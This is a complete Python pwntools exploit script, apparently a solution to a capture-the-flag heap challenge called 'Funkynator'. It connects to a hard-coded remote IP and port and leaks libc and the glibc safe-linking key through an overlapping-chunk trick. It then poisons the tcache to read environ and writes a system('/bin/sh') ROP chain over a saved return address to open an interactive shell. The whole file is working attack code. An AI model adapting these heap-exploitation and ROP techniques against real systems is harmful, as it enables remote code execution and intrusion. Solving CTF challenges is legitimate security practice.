#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
context.log_level = "info"

ROOT = "Funkynator/challenge"
LIBC_ENVIRON = 0x1EEE28
LIBC_BINSH = 0x1A7EA4
LIBC_SYSTEM = 0x53110
LIBC_LEAK_OFF = 0x1E7B20
STACK_RIP_DELTA = 0x1B0

libc = ELF(f"{ROOT}/glibc/libc.so.6", checksec=False)
rop = ROP(libc)
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET = rop.find_gadget(["ret"]).address


def conn():
    if args.LOCAL:
        io = process([
            f"{ROOT}/glibc/ld-linux-x86-64.so.2",
            "--library-path", f"{ROOT}/glibc",
            f"{ROOT}/funkynator",
        ])
    else:
        host = sys.argv[1] if len(sys.argv) > 1 else "154.57.164.66"
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 31344
        io = remote(host, port, timeout=10)
    io.sendlineafter(b"name?\n", b"hacker")
    return io


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def create_and_save(io, size, data=None):
    menu(io, 2)
    io.sendlineafter(b":\n", str(size).encode())
    io.sendlineafter(b":\n", (data or b"A" * size).ljust(size, b"A")[:size])
    io.sendlineafter(b"text?\n", b"n")
    io.sendlineafter(b"memory?\n", b"y")
    io.recvuntil(b"location ")
    return int(io.recvline().strip())


def delete(io, slot):
    menu(io, 4)
    io.sendlineafter(b":\n", str(slot).encode())


def cont(io, slot):
    menu(io, 5)
    io.sendlineafter(b":\n", str(slot).encode())
    io.recvuntil(b"> ")


def ow(io, offset, value):
    io.sendline(b"3")
    io.sendlineafter(b":\n", str(offset & 0xffffffffffffffff).encode())
    io.sendafter(b"?\n", bytes([value & 0xff]) + b"\n")
    io.recvuntil(b"> ")


def wb(io, offset, data):
    for i, value in enumerate(data):
        ow(io, offset + i, value)


def examine(io):
    io.sendline(b"2")
    io.recvuntil(b"Your message:\n")
    data = io.recvuntil(b"+---------------------------+", drop=True)
    io.recvuntil(b"> ")
    return data.rstrip(b"\n")


def stop(io, save):
    io.sendline(b"1")
    io.sendlineafter(b"memory?\n", b"y" if save else b"n")
    if save:
        io.recvuntil(b"location ")
        return int(io.recvline().strip())


def exploit(io):
    # Unsorted-bin libc leak.
    a = create_and_save(io, 0x100)
    b = create_and_save(io, 0x500)
    create_and_save(io, 0x20)  # guard chunk
    delete(io, b)
    cont(io, a)
    ow(io, -8, 0x21)
    ow(io, -7, 0x06)
    wb(io, 0x100, b"A" * 0x10)
    wb(io, 0x118, b"A" * 8)
    leak_data = examine(io)
    libc_leak = u64(leak_data[0x110:0x116] + b"\0\0")
    libc_base = libc_leak - LIBC_LEAK_OFF
    log.success(f"libc base: {libc_base:#x}")

    # Repair allocator metadata before freeing the overlapping chunk.
    ow(io, -8, 0x11)
    ow(io, -7, 0x01)
    wb(io, 0x100, b"\0" * 8)
    ow(io, 0x108, 0x11)
    ow(io, 0x109, 0x05)
    wb(io, 0x10A, b"\0" * 6)
    wb(io, 0x110, p64(libc_leak))
    wb(io, 0x118, p64(libc_leak))
    stop(io, False)

    # Leak safe-linking key from a tcache entry whose decoded fd is NULL.
    ka = create_and_save(io, 0x28)
    kb = create_and_save(io, 0x28)
    delete(io, kb)
    cont(io, ka)
    ow(io, -8, 0x91)
    wb(io, 0x28, b"B" * 0x18)
    wb(io, 0x48, b"B" * 8)
    key_data = examine(io)
    heap_key = u64(key_data[0x40:0x48].ljust(8, b"\0"))
    log.success(f"safe-linking key: {heap_key:#x}")
    ow(io, -8, 0x41)
    stop(io, True)

    # Poison a two-entry 0x40 tcache list toward environ-0x48.
    p = create_and_save(io, 0x28)
    q = create_and_save(io, 0x28)
    r = create_and_save(io, 0x28)
    delete(io, r)
    delete(io, q)
    cont(io, p)
    ow(io, -8, 0x91)
    target = libc_base + LIBC_ENVIRON - 0x48
    wb(io, 0x40, p64(target ^ heap_key))
    ow(io, -8, 0x41)
    stop(io, True)
    create_and_save(io, 0x28, b"X" * 0x28)
    target_slot = create_and_save(io, 0x28, b"Y" * 0x28)

    # Print through environ, calculate this editor frame's saved RIP, and
    # install a libc ROP chain byte-by-byte.
    cont(io, target_slot)
    wb(io, 0x28, b"E" * 0x20)
    stack_data = examine(io)
    stack_leak = u64(stack_data[0x48:0x4e] + b"\0\0")
    saved_rip = stack_leak - STACK_RIP_DELTA
    log.success(f"stack leak: {stack_leak:#x}; saved RIP: {saved_rip:#x}")
    chain = flat(
        libc_base + RET,
        libc_base + POP_RDI,
        libc_base + LIBC_BINSH,
        libc_base + LIBC_SYSTEM,
    )
    wb(io, saved_rip - target, chain)
    io.sendline(b"1")
    return io


if __name__ == "__main__":
    tube = exploit(conn())
    if args.CMD:
        tube.sendline(args.CMD.encode())
        print(tube.recvrepeat(2).decode("latin-1", errors="replace"))
    else:
        tube.interactive()
